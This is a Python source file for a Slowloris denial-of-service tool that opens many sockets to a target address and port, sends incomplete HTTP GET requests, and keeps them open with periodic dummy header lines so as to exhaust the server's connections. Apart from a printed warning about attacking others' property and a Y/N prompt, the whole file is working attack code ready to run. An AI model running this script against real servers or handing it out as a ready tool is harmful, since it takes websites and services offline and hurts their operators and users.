#Import Dependencies
import sys
import socket
import logging
import time
import random
from pyfiglet import Figlet

f = Figlet(font='slant')
print(f.renderText('Slow Loris Attack'))

address = ''
port = ''
sockets = ''

#Help Manual
def helpScript():
    print("\n---------------------------------------------------------")
    print("HELP NEEDED =>")
    print("---------------------------------------------------------")
    print("To run the script, you need to pass exactly 3 arguments:")
    print("python script.py [address] [port] [number of sockets]")
    print("---------------------------------------------------------\n")
    exit()

#Checks if the server is Up/Down
def checkServerLive(address,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((address,port))
    if result == 0:
        print("\nPort is Open. We Can Attack.")
        print("-------------------------------------")
        print("Starting the Attack . . .")
    else:
        print("\nPort is Not Open. Can't Attack.")
        print("-------------------------------------")
        print("Closing the Script . . .")
        exit()

#Argument Checker
def checkArguments():
    arguments = sys.argv[1:]
    if len(arguments) != 3:
        helpScript()
    else:
        global address
        global port
        global sockets
        address = arguments[0].strip()
        port = int(arguments[1].strip())
        sockets = int(arguments[2].strip())
        with open('config.txt','w+') as f:
            f.write(address + ":" + str(port))
        print("\nNote: If the Target is not your property, you may end up committing a crime.")
        print("Do you still want to proceed? (Y/N)",end=" ")
        option = input()
        if option == 'N':
            exit()
        else:
            checkServerLive(address,port)

#Create Socket
def createSocket():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((address,port))
    message = "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
    s.send(message)
    print(message)
    return s

socketList = list()
if __name__ == '__main__':
    checkArguments()
    print("Attacking",address,"with",sockets,"sockets.")
    for _ in range(sockets):
        try:
            s = createSocket()
            socketList.append(s)
        except socket.error:
            break

    while True:
        try:
            for s in socketList:
                try:
                    message = "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    s.send(message)
                    print(message)
                except:
                    socketList.remove(s)

            for _ in range(sockets - len(socketList)):
                try:
                    s = createSocket()
                    if s:
                        socketList.append(s)
                except:
                    break
            time.sleep(100)
        except(KeyboardInterrupt, SystemExit):
            print("Stopping Attack")
            break
